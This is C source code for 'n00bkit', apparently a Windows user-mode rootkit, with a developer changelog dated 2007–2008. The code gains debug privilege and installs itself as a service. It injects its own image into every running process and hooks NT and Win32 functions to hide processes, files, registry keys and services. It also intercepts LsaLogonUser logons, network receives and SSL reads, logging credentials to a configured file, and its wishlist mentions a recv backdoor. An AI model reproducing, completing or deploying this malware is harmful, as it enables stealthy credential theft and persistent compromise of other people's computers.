// n00bkit Final
//
// 18/01/2008
//
// TODO: - NtWriteVirtualMemory, protect hooks
//       - Finish Unhook (existing jmp)
//       - Add trampolines
// 16/11/2007
// Done:
// - Installing, updating and uninstalling hooks
// - Engine ((un)hooking)
// - Polymorph jmpcode --> issues, so it's disabled at this moment
// - Config using string resources
//
// 30/11/2007
// Beta version (more then that actually)
// - Logging works
//
// 01/12/2007
// - 1st issue: mmc seems to works on 99% of the boxes, got one that has problems with it, 3 others np, vmware np
// - 2nd issue: on 1 of the 6 boxes i tested with mcaffee bof prot, 1 had probz with it (null pointer dereferences)
// - Wishlist: ws2_32.recv backdoor, remote connection logging (if thats even possible), more stealth

// small exe shit
#pragma comment(linker,"/MERGE:.rdata=.data")
#pragma comment(linker,"/MERGE:.text=.data")
#pragma comment(linker, "/MERGE:.reloc=.data")
#if (_MSC_VER < 1300)
	#pragma comment(linker,"/IGNORE:4078")
	#pragma comment(linker,"/OPT:NOWIN98")
#endif
#pragma comment(linker,"/OPT:REF")
#pragma comment (lib,"libctiny")
#pragma optimize("gsy",on)

#pragma comment (linker,"/base:0x13370000")
#pragma comment(lib,"ntdll")

#include <winsock2.h>
#include <windows.h>
#include <time.h>
#include "ntdll.h"

#include "engine.h"
#include "misc.h"
#include "randoma.h"
#include "resource.h"
#include "config.h"
#include "n00bk1t.h"

#include "ntresumethread.h"
#include "ldrloaddll.h"
#include "ldrunloaddll.h"
#include "ntquerysysteminformation.h"
#include "ntquerydirectoryfile.h"
#include "ntvdmcontrol.h"
#include "ntdeviceiocontrolfile.h"
#include "ntenumeratekey.h"
#include "ntenumeratevaluekey.h"
#include "ntqueryvolumeinformationfile.h"
#include "ntopenfile.h"
#include "ntcreatefile.h"
#include "ntreadfile.h"
#include "ntreadvirtualmemory.h"
#include "ntqueryvirtualmemory.h"
#include "ntopenprocess.h"
#include "ntsavekey.h"
#include "ntsavemergedkeys.h"
#include "enumservicesstatusa.h"
#include "enumservicegroupw.h"
#include "enumservicesstatusexa.h"
#include "enumservicesstatusexw.h"
#include "lsalogonuser.h"
#include "recv.h"
#include "wsarecv.h"
#include "ssl_read.h"

// nr of jmp code items in jmptable
extern DWORD JMP_TABLE_SIZE;

// OS version
DWORD dwMajorVersion;
DWORD dwMinorVersion;

// our base address
HMODULE n00bk1tBaseAddress;
// our logfile
CHAR	n00bk1tLogFile[MAX_PATH+1];

HOOKTABLE HookTable[]=
{
	{"NTDLL.DLL","NtResumeThread",&OldNtResumeThread,0,NewNtResumeThread,NULL},
	{"NTDLL.DLL","LdrLoadDll",&OldLdrLoadDll,0,NewLdrLoadDll,NULL},
	{"NTDLL.DLL","LdrUnloadDll",&OldLdrUnloadDll,0,NewLdrUnloadDll,NULL},
	{"NTDLL.DLL","NtQuerySystemInformation",&OldNtQuerySystemInformation,0,NewNtQuerySystemInformation,NULL},
	{"NTDLL.DLL","NtQueryDirectoryFile",&OldNtQueryDirectoryFile,0,NewNtQueryDirectoryFile,NULL},
	{"NTDLL.DLL","NtVdmControl",&OldNtVdmControl,0,NewNtVdmControl,NULL},
	{"NTDLL.DLL","NtDeviceIoControlFile",&OldNtDeviceIoControlFile,0,NewNtDeviceIoControlFile,NULL},
	{"NTDLL.DLL","NtEnumerateKey",&OldNtEnumerateKey,0,NewNtEnumerateKey,NULL},
	{"NTDLL.DLL","NtEnumerateValueKey",&OldNtEnumerateValueKey,0,NewNtEnumerateValueKey,NULL},
	{"NTDLL.DLL","NtQueryVolumeInformationFile",&OldNtQueryVolumeInformationFile,0,NewNtQueryVolumeInformationFile,NULL},
	{"NTDLL.DLL","NtOpenFile",&OldNtOpenFile,0,NewNtOpenFile,NULL},
	{"NTDLL.DLL","NtCreateFile",&OldNtCreateFile,0,NewNtCreateFile,NULL},
	{"NTDLL.DLL","NtReadFile",&OldNtReadFile,0,NewNtReadFile,NULL},
	//{"NTDLL.DLL","NtReadVirtualMemory",&OldNtReadVirtualMemory,0,NewNtReadVirtualMemory,NULL},
	//{"NTDLL.DLL","NtQueryVirtualMemory",&OldNtQueryVirtualMemory,0,NewNtQueryVirtualMemory,NULL},
	{"NTDLL.DLL","NtOpenProcess",&OldNtOpenProcess,0,NewNtOpenProcess,NULL},
	{"NTDLL.DLL","NtSaveKey",&OldNtSaveKey,0,NewNtSaveKey,NULL},
	{"NTDLL.DLL","NtSaveMergedKeys",&OldNtSaveMergedKeys,0,NewNtSaveMergedKeys,NULL},
	{"ADVAPI32.DLL","EnumServicesStatusA",&OldEnumServicesStatusA,0,NewEnumServicesStatusA,NULL},
	{"ADVAPI32.DLL","EnumServiceGroupW",&OldEnumServiceGroupW,0,NewEnumServiceGroupW,NULL},
	{"ADVAPI32.DLL","EnumServicesStatusExA",&OldEnumServicesStatusExA,0,NewEnumServicesStatusExA,NULL},
	{"ADVAPI32.DLL","EnumServicesStatusExW",&OldEnumServicesStatusExW,0,NewEnumServicesStatusExW,NULL},
	{"SECUR32.DLL","LsaLogonUser",&OldLsaLogonUser,0,NewLsaLogonUser,NULL},
	{"WS2_32.DLL","recv",&OldRecv,0,NewRecv,NULL},
	{"WS2_32.DLL","WSARecv",&OldWSARecv,0,NewWSARecv,NULL},
	{"SSLEAY32.DLL","SSL_read",&OldSSL_read,0,NewSSL_read,NULL},

},
HookTableEnd;

// run thru hooktable and hook functions
void n00bk1t_DoHook(HANDLE hProcess)
{
	LPVOID lpFunction;
	int iRnd,iCount;
	DWORD dwFunctionSize;
	LPVOID lpFunctionAddress;

	// run thru the hook table
	for (iCount=0;iCount<sizeof(HookTable)/sizeof(HookTableEnd);iCount++)
	{
		// randomize baby !
		iRnd=XIRandom(0,JMP_TABLE_SIZE);

		// place hook
		lpFunction=
			engine_HookFunctionInProcess
			(
				hProcess,
				HookTable[iCount].lpLibraryName,
				HookTable[iCount].lpFunctionName,
				HookTable[iCount].lpNewFunction,
				&dwFunctionSize,
				&lpFunctionAddress,
				iRnd
			);

		if (lpFunction)
		{
			// save address of original function in process
			engine_SaveRemoteVar(hProcess,HookTable[iCount].lpOldFunction,&lpFunction);
			// save size of original function 
			engine_SaveRemoteVar(hProcess,&HookTable[iCount].dwOldFunctionSize,&dwFunctionSize);
			// save size of function address
			engine_SaveRemoteVar(hProcess,&HookTable[iCount].lpFunctionAddress,&lpFunctionAddress);
			
		}
	}
}

// function that does the hooking in a process given by a handle
// can be passed to n00bk1t_EnumAndSuspendResumeRunningProcesses
void n00bk1t_HookProcess(HANDLE hProcess)
{
	// copy ourself to the process
	if (engine_CopyImageToProcess(hProcess,n00bk1tBaseAddress))
	{
		// hook
		n00bk1t_DoHook(hProcess);
	}
}

// updates the config of a process (resource)
// again passed to n00bk1t_EnumAndSuspendResumeRunningProcesses
void n00bk1t_UpdateProcessConfig(HANDLE hProcess)
{
	LPVOID	lpOldFuncArray[sizeof(HookTable)/sizeof(HookTableEnd)];
	DWORD	dwOldFuncSizeArray[sizeof(HookTable)/sizeof(HookTableEnd)];
	LPVOID	lpFuncArray[sizeof(HookTable)/sizeof(HookTableEnd)];
	DWORD	dwModuleSize;
	int		iCount;

	// run thru the hook table and load the addresses/size of the old functions
	for (iCount=0;iCount<sizeof(HookTable)/sizeof(HookTableEnd);iCount++)
	{
		if (!engine_LoadRemoteVar(hProcess,HookTable[iCount].lpOldFunction,&lpOldFuncArray[iCount]))
			return;

		if (!engine_LoadRemoteVar(hProcess,&HookTable[iCount].dwOldFunctionSize,&dwOldFuncSizeArray[iCount]))
			return;

		if (!engine_LoadRemoteVar(hProcess,&HookTable[iCount].lpFunctionAddress,&lpFuncArray[iCount]))
			return;
	}

	// get my size :D
	dwModuleSize=engine_GetPEImageSize(n00bk1tBaseAddress);

	// free ourself in remote process
	if (!NT_SUCCESS(NtFreeVirtualMemory(hProcess,&n00bk1tBaseAddress,&dwModuleSize,MEM_RELEASE)))
		return;

	// copy ourself back to the remote process
	if (engine_CopyImageToProcess(hProcess,n00bk1tBaseAddress))
	{
		// run thru the hook table and save addresses/size of old functions
		for (iCount=0;iCount<sizeof(HookTable)/sizeof(HookTableEnd);iCount++)
		{
			engine_SaveRemoteVar(hProcess,HookTable[iCount].lpOldFunction,&lpOldFuncArray[iCount]);
			engine_SaveRemoteVar(hProcess,&HookTable[iCount].dwOldFunctionSize,&dwOldFuncSizeArray[iCount]);
			engine_SaveRemoteVar(hProcess,&HookTable[iCount].lpFunctionAddress,&lpFuncArray[iCount]);
		}
	}
}

// function that does the UNhooking in a process given by a handle
// and again passed to n00bk1t_EnumAndSuspendResumeRunningProcesses
// (unstable), maybe check every threads EIP and step ?
void n00bk1t_UnHookProcess(HANDLE hProcess)
{
	LPVOID	lpOldFuncArray[sizeof(HookTable)/sizeof(HookTableEnd)];
	DWORD	dwOldFuncSizeArray[sizeof(HookTable)/sizeof(HookTableEnd)];
	DWORD	dwModuleSize;
	int		iCount;
	
	// run thru the hook table and load the addresses/size of the old functions
	for (iCount=0;iCount<sizeof(HookTable)/sizeof(HookTableEnd);iCount++)
	{
		if (!engine_LoadRemoteVar(hProcess,HookTable[iCount].lpOldFunction,&lpOldFuncArray[iCount]))
			return;

		if (!engine_LoadRemoteVar(hProcess,&HookTable[iCount].dwOldFunctionSize,&dwOldFuncSizeArray[iCount]))
			return;

		// we don't need lpAddressFunction
	}

	// run thru the hook table
	for (iCount=0;iCount<sizeof(HookTable)/sizeof(HookTableEnd);iCount++)
	{
		if (lpOldFuncArray[iCount])
		{
			// remove hook
			if (!engine_UnHookFunctionInProcess
			(
				hProcess,
				HookTable[iCount].lpLibraryName,
				HookTable[iCount].lpFunctionName,
				lpOldFuncArray[iCount],
				dwOldFuncSizeArray[iCount]
			))
				return;
		}
	}

	// get my size :D
	dwModuleSize=engine_GetPEImageSize(n00bk1tBaseAddress);

	// free ourself in process
	NtFreeVirtualMemory(hProcess,&n00bk1tBaseAddress,&dwModuleSize,MEM_RELEASE);
}

// we need this function for multiple tasks (hooking,updating & unhooking), thats why we can pass
// a function which receives the handle to the suspended process
void n00bk1t_EnumAndSuspendResumeRunningProcesses(SUSPENDPROC spSuspendProc)
{
	LPVOID lpPsList,lpSysProc;
	PSYSTEM_THREAD pSysThread;
	OBJECT_ATTRIBUTES oa={sizeof(oa)};
	ANSI_STRING asProcess;
	CLIENT_ID clientID;
	HANDLE hThread;
	HANDLE hProcess;
	DWORD dwCount;
		
	// get the processlist buffer
	if (!(lpPsList=misc_GetProcessListBuffer()))
		return;

	lpSysProc=lpPsList;
	while(1)
	{
		// NT4 thread struct differs from newer NT versions
		if (dwMajorVersion<5) pSysThread=((PSYSTEM_PROCESS_INFORMATION_NT4)lpSysProc)->aThreads;
		else pSysThread=((PSYSTEM_PROCESS_INFORMATION_NT5)lpSysProc)->aThreads;
				
		// ignore System & ourself
		if (((PSYSTEM_PROCESS_INFORMATION)lpSysProc)->dUniqueProcessId!=0&&((PSYSTEM_PROCESS_INFORMATION)lpSysProc)->dUniqueProcessId!=misc_NtGetCurrentProcessId())
		{
			// check for root process
			RtlUnicodeStringToAnsiString(&asProcess,&((PSYSTEM_PROCESS_INFORMATION)lpSysProc)->usName,TRUE);

			// comment: this is for testing only, this should be !()
			// check for root process
			if (!config_CheckString(ConfigRootProcess,asProcess.Buffer,asProcess.Length))
			{
				// suspend all threads
				for (dwCount=0;dwCount<((PSYSTEM_PROCESS_INFORMATION)lpSysProc)->dThreadCount;dwCount++)
				{
					if (NT_SUCCESS(NtOpenThread(&hThread,THREAD_SUSPEND_RESUME,&oa,&pSysThread[dwCount].Cid)))
					{
						NtSuspendThread(hThread,NULL);
						NtClose(hThread);
					}
				}

				// get handle to the process
				clientID.UniqueProcess=(HANDLE)((PSYSTEM_PROCESS_INFORMATION)lpSysProc)->dUniqueProcessId;
				clientID.UniqueThread=0;
				
				// open process
				if (NT_SUCCESS(NtOpenProcess(&hProcess,PROCESS_ALL_ACCESS,&oa,&clientID)))
				{
					// run suspendfunction
					spSuspendProc(hProcess);

					// close handle
					NtClose(hProcess);
				}

				// resume all threads
				for (dwCount=0;dwCount<((PSYSTEM_PROCESS_INFORMATION)lpSysProc)->dThreadCount;dwCount++)
				{
					if (NT_SUCCESS(NtOpenThread(&hThread,THREAD_SUSPEND_RESUME,&oa,&pSysThread[dwCount].Cid)))
					{
						NtResumeThread(hThread,NULL);
						NtClose(hThread);
					}
				}
			}

			RtlFreeAnsiString(&asProcess);
		}

		// next record
		if (((PSYSTEM_PROCESS_INFORMATION)lpSysProc)->dNext) lpSysProc=(LPVOID)((char*)lpSysProc+((PSYSTEM_PROCESS_INFORMATION)lpSysProc)->dNext);
		else break;
	}
	
	// free processlist buffer
	misc_FreeBuffer(&lpPsList);

}

// this does the in process hooking (called in NewLdrInitializeThunk)
void n00bk1t_HookCurrentProcess(void)
{
	LPVOID lpPsList;
	ANSI_STRING asProcess;
	PSYSTEM_PROCESS_INFORMATION lpSysProc;
	
	// get the processlist buffer
	if (!(lpPsList=misc_GetProcessListBuffer()))
		return;

	lpSysProc=(PSYSTEM_PROCESS_INFORMATION)lpPsList;
	while (1)
	{
		if (lpSysProc->dUniqueProcessId==misc_NtGetCurrentProcessId())
			break;

		// next record
		if (lpSysProc->dNext!=0) lpSysProc=(PSYSTEM_PROCESS_INFORMATION)((char*)lpSysProc+lpSysProc->dNext);
		else break;
	}

	if (!NT_SUCCESS(RtlUnicodeStringToAnsiString(&asProcess,&lpSysProc->usName,TRUE)))
		return;
	
	// check for root process
	if (!config_CheckString(ConfigRootProcess,asProcess.Buffer,asProcess.Length))
	{
		// hook
		n00bk1t_DoHook(NtCurrentProcess());
	}

	RtlFreeAnsiString(&asProcess);
						
	// free processlist buffer
	misc_FreeBuffer(&lpPsList);
}

// service control msg handler
void WINAPI n00bk1t_ServiceHandler(DWORD fdwControl)
{
	// accept shutdown
    if(fdwControl==SERVICE_CONTROL_SHUTDOWN)
    {
        ExitProcess(0);
    }
}

// service main
int WINAPI n00bk1t_ServiceMain(DWORD dwArgc, LPTSTR *lpszArgv)
{
	SERVICE_STATUS_HANDLE sth;
    SERVICE_STATUS status;
	ANSI_STRING asSvcName;

	// get servicename from config
	if (config_GetAnsiString(n00bk1tBaseAddress,ConfigServiceName,&asSvcName))
	{
		// register service
		sth=RegisterServiceCtrlHandler(asSvcName.Buffer,n00bk1t_ServiceHandler);
    
		// set service status
		memset(&status,0,sizeof(SERVICE_STATUS));
		status.dwServiceType=SERVICE_WIN32_OWN_PROCESS;
		status.dwCurrentState=SERVICE_RUNNING;
		status.dwControlsAccepted=SERVICE_ACCEPT_SHUTDOWN;
		status.dwWin32ExitCode=NO_ERROR;
		SetServiceStatus(sth,&status);

		RtlFreeAnsiString(&asSvcName);
	}

	// place hooks in all running processes
	n00bk1t_EnumAndSuspendResumeRunningProcesses(n00bk1t_HookProcess);

	return 1;
}

void n00bk1t_Main(LPSTR lpArg)
{
	SERVICE_TABLE_ENTRY ste[2];
	ANSI_STRING asSvcName;
	ANSI_STRING asSvcDispName;
	ANSI_STRING asSvcDesc;

	if (stricmp(lpArg,"-ud")==0)
	{
		// update
		// update module in all processes
		n00bk1t_EnumAndSuspendResumeRunningProcesses(n00bk1t_UpdateProcessConfig);
	}
	else if (stricmp(lpArg,"-ui")==0)
	{
		// uninstall
		// unhook and unload module in all processes
		n00bk1t_EnumAndSuspendResumeRunningProcesses(n00bk1t_UnHookProcess);
	}
	else
	{
		// run as service ?
		if (config_GetInt(n00bk1tBaseAddress,ConfigRunAsService)==1)
		{
			if (config_GetAnsiString(n00bk1tBaseAddress,ConfigServiceName,&asSvcName))
			{
				if (config_GetAnsiString(n00bk1tBaseAddress,ConfigServiceDisplayName,&asSvcDispName))
				{
					if (config_GetAnsiString(n00bk1tBaseAddress,ConfigServiceDescription,&asSvcDesc))
					{
						ste[0].lpServiceName=asSvcName.Buffer;
						ste[0].lpServiceProc=n00bk1t_ServiceMain;
						ste[1].lpServiceName=NULL;
						ste[1].lpServiceProc=NULL;

						// start as service
						if(!StartServiceCtrlDispatcher(ste))
						{
							// install/run service
							if (misc_InstallService(asSvcName.Buffer,asSvcDispName.Buffer,asSvcDesc.Buffer))
							{
								RtlFreeAnsiString(&asSvcName);
								RtlFreeAnsiString(&asSvcDispName);
								RtlFreeAnsiString(&asSvcDesc);
								ExitProcess(0);
							}

							// run normal
							n00bk1t_EnumAndSuspendResumeRunningProcesses(n00bk1t_HookProcess);
						}
					}
					RtlFreeAnsiString(&asSvcDesc);
				}
				RtlFreeAnsiString(&asSvcDispName);
			}
			RtlFreeAnsiString(&asSvcName);
		}
		else
		{
			// run normal
			n00bk1t_EnumAndSuspendResumeRunningProcesses(n00bk1t_HookProcess);
		}
	}
}

// init remote hooktable
void n00bk1t_CleanRemoteHookTable(HANDLE hProcess)
{
	int	iCount;
	LPVOID lpVoid=NULL;
	DWORD dwSize=0;

	for (iCount=0;iCount<sizeof(HookTable)/sizeof(HookTableEnd);iCount++)
	{
		engine_SaveRemoteVar(hProcess,HookTable[iCount].lpOldFunction,&lpVoid);
		engine_SaveRemoteVar(hProcess,&HookTable[iCount].dwOldFunctionSize,&dwSize);
		engine_SaveRemoteVar(hProcess,&HookTable[iCount].lpFunctionAddress,&lpVoid);
	}
}

int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow)
{
	ANSI_STRING asLogFile;

	// !! get our base address !!
	n00bk1tBaseAddress=GetModuleHandle(NULL);

	// get logfile from config
	if (config_GetAnsiString(n00bk1tBaseAddress,ConfigCredLogFile,&asLogFile))
	{
		ExpandEnvironmentStrings(asLogFile.Buffer,n00bk1tLogFile,MAX_PATH);
		RtlFreeAnsiString(&asLogFile);
	}

	// init random
	XRandomInit(time(NULL)*GetTickCount());

	// Get "debug" privilege
	misc_GetDebugPriv();

	// get version number(s)
	misc_GetOSVersion(&dwMajorVersion,&dwMinorVersion);

	// init hooktable
	n00bk1t_CleanRemoteHookTable(NtCurrentProcess());

	// run main
	n00bk1t_Main(lpCmdLine);

	return 0;
}

